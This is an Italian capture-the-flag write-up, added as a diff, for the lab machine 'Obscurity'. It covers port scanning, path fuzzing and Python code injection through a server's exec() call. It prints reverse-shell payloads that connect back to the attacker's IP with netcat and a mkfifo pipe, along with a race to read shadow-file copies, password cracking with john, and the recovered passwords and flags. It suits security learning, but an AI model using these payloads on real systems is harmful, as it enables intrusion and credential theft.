@@ -1,0 +1,138 @@
+1) come sempre masscan e nmap:
+	masscan -p1-65535 10.10.10.168 --rate 1000 --open --banners -e tun0
+	nmap -p22,8080 -Pn -sC -sV -oA nmap/obscurity 10.10.10.168
+
+22/tcp   open  ssh        OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   2048 33:d3:9a:0d:97:2c:54:20:e1:b0:17:34:f4:ca:70:1b (RSA)
+|   256 f6:8b:d5:73:97:be:52:cb:12:ea:8b:02:7c:34:a3:d7 (ECDSA)
+|_  256 e8:df:55:78:76:85:4b:7b:dc:70:6a:fc:40:cc:ac:9b (ED25519)
+8080/tcp open  http-proxy BadHTTPServer
+
+
+2)per prima cosa analizzo la porta 8080, sembra un web server e infatti c'è una home page
+	-> security by obscurity
+	-> web server e tutto il codice scritto dagli sviluppatori stessi
+	-> nota per gli sviluppatori (fine pagina): the current source code for the web server is in 'SuperSecureServer.py' in the secret development directory
+potrebbe essere utile trovare quindi il codice (per farlo serve trovare la cartella, quindi uso dirb)
+
+con dirb non è stato trovato nulla, quindi provo con wfuzz:
+	
+	wfuzz -c -z file,/root/Desktop/lists/common_dirs.txt http://10.10.10.168:8080/FUZZ/SuperSecureServer.py
+
+la cartella è "develop". In questo mod è possibile scaricare il file.
+
+3) cose strane del file:
+	-> tra i codici c'è un 304:NOT MODIFIED quindi si può modificare qualcosa?
+	-> tra i mime types i file .py vengono riportati come plain files
+	-> exec(info.format(path)) # This is how you do string formatting, right?
+	dove:
+		info -> info = "output = 'Document: {}'" # Keep the output for later debug
+		path -> viene passato alla funzione, ad esempio /errors/400.html
+	dalla documentazione, fomat ritorna : Returns a formatted string with the value passed as parameter in the placeholder position. 
+	quindi in questo caso se path=/, ritorna "Document: /"
+	
+visto che exec() esegue codice python, è necessario riuscire a fare inject di un codice python che permette di ottenere una reverse shell, il codice è:
+	'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("127.0.0.1",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
+
+dopo vari tentativi si riesce a fare inject di una semplice istruzione ponendo :
+	path="' + print('ciao') + '"
+
+ora devo cercare di ottenere una shell, quindi devo sostituire la printo con un codice capace di generare una shell (come quello scritto prima).
+
+dopo varie prove in locale, ecco il valore che deve avere la variabile path:
+	path="'+ os.system('nc -e /bin/sh 127.0.0.1 4444') +'"		//al posto di 127.0.0.1 ovviamente ci va l'ind ip locale di tun0
+
+
+4)ora si deve vedere come fare l'injection sul server direttamente, da come visto dal file, path è request.doc, ottenuto da parserequest()
+conviene far partire il server in locale e vedere che sezione è request.doc in modo tale da fare inject correttamente.
+analizzando, request.doc è proprio il path richiesto al sito quindi ad esempio /index.html ecc
+
+usando semplicemente /"'+ os.system('nc -e /bin/sh 127.0.0.1 4444') +'" in locale funziona
+
+ora si deve provare in remoto con il server vero e proprio, il comando usato in locale non funziona, probabilmente a causa del payload
+quindi provando altri payload, quello funzionante è:
+	
+		http://10.10.10.168:8080/'+os.system('mkfifo /tmp/p; nc 10.10.14.115 4444 0</tmp/p | /bin/sh > /tmp/p 2>&1; rm /tmp/p')+'
+
+(ovviamente per ottenre la reverse shell è necessario avere attivo il listener netcat -lvnp 4444
+
+5)ora ho una shell, come utente www-data. Ho bisogno di ottenere i permessi di user "robert" per ottenere user.txt:
+
+ls -lag /home/robert/
+total 60
+drwxr-xr-x 7 robert 4096 Dec  2 09:53 .
+drwxr-xr-x 3 root   4096 Sep 24 22:09 ..
+lrwxrwxrwx 1 robert    9 Sep 28 23:28 .bash_history -> /dev/null
+-rw-r--r-- 1 robert  220 Apr  4  2018 .bash_logout
+-rw-r--r-- 1 robert 3771 Apr  4  2018 .bashrc
+drwxr-xr-x 2 root   4096 Dec  2 09:47 BetterSSH
+drwx------ 2 robert 4096 Oct  3 16:02 .cache
+-rw-rw-r-- 1 robert   94 Sep 26 23:08 check.txt
+drwxr-x--- 3 robert 4096 Dec  2 09:53 .config
+drwx------ 3 robert 4096 Oct  3 22:42 .gnupg
+drwxrwxr-x 3 robert 4096 Oct  3 16:34 .local
+-rw-rw-r-- 1 robert  185 Oct  4 15:01 out.txt
+-rw-rw-r-- 1 robert   27 Oct  4 15:01 passwordreminder.txt
+-rw-r--r-- 1 robert  807 Apr  4  2018 .profile
+-rwxrwxr-x 1 robert 2514 Oct  4 14:55 SuperSecureCrypt.py
+-rwx------ 1 robert   33 Sep 25 14:12 user.txt
+
+per prima cosa ottengo una shell migliore con python (tty shell):
+	python3 -c 'import pty; pty.spawn("/bin/bash")' 
+		
+analizzando i file:
+	check.txt -> contiene la scritta: "Encrypting this file with your key should result in out.txt, make sure your key is correct!"
+	out.txt -> caratteri criptati
+	passwordreminder.txt -> caratteri criptati
+	SuperSecureCrypt.py -> funzione di criptazione/decriptazione
+
+probabilmente devo usare i file check e out (conoscendo l'algoritmo contenuto in SuperSecureCrypt.py) per ottenere una chiave
+per decriptare passwordreminder.txt e ottener la password di robert -> poi posso accedere tramite ssh.
+
+A mano ho ottenuto la key sfruttando check.txt e out.txt
+la key è: alexandrovich
+in questo modo è possibile ottener la password utente che è: SecThruObsFTW 	
+
+
+6) a questo punto ho fatto l'accesso tramite ssh con robert@10.10.10.168:SecThruObsFTW
+a questo punto facilmente si ottine il flag utente:
+	
+	e4493782066b55fe2755708736ada2d7
+	
+7) per ottenere permessi root, inizio dalla dir BetterSSH che è l'unica nella home dell'user robert ad essere owned da root, contiene:
+
+-rwxr-xr-x 1 root   1805 Oct  5 13:09 BetterSSH.py
+
+questo script crea un'autenticazione per un utente, copia il file shadow delle password in
+/tmp/SSH/ e poi lo rimuove se la password fornita è sbagliata, è importante ottenere il file prima che esso venga eliminato
+inoltre facendo sudo -l vedo che l'user robert può eseguire come root python3 BetterSSH.py e infatti posso eseguire:
+
+sudo /usr/bin/python3 /home/robert/BetterSSH/BetterSSH.py	
+
+(inizialmente lo script non funzionava, ho dovurto creare la cartella /tmp/SSH)
+
+Inserendo le credenziali corrette semplicemente si riesce ad ottenere una shell con l'user specificato
+quindi è necessario ottenere la password di root, ciò è possibile tramite il file shadow che viene creato
+e poi cancellato ogni volta dallo script stesso
+
+per ottenere i dati ho usato due teerminali connessi tramite ssh -> uno eseguiva lo script, l'altro invece -> while true; do more /tmp/SSH/*; done
+si poteva fare anche in modo migliore con il comando watch oppure usando uno scirpt fatto apposta.
+Quello che ho ottenuto è in shadow_ottenuto
+ora devo decifrare il file, posso usare johnny
+
+john --wordlist=/root/Desktop/lists/rockyou-30.txt shadow_ottenuto
+
+e ottengo che la password è mercedes -> a questo punto posso accedere usando direttamente BetterSSH.py con credenziali root:mercedes
+
+infine ottengo il flag di root dalla dir /root/ (visto che cd non si può usare tramite BetterSSH faccio direttamente cat /root/root.txt:
+
+512fd4429f33a113a44d5acde23609e3
+
+
+		
+
+
+
+
+
